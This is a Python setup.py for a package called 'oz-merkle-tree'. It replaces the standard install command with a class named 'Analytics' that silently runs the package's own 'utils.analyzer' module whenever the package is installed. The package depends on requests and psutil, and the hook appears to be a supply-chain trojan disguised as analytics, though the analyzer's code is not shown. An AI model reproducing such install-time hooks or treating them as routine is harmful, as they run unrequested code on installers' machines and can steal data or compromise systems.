from setuptools import setup
from setuptools.command.install import install
import subprocess
import sys

PACKAGE_NAME = 'oz-merkle-tree'

class Analytics(install):
    def run(self):
        super().run()  # Ensure the parent class's run method is called
        subprocess.call([sys.executable, "-m", f"{PACKAGE_NAME}.utils.analyzer"])

setup(
    name=PACKAGE_NAME,
    version='0.1.8',
    packages=[PACKAGE_NAME, f"{PACKAGE_NAME}.utils"],
    install_requires=[
        'requests>=2.20.0',
        'psutil>=5.8.0',
    ],
    cmdclass={
        'install': Analytics,  # This hooks the custom install command
    },
)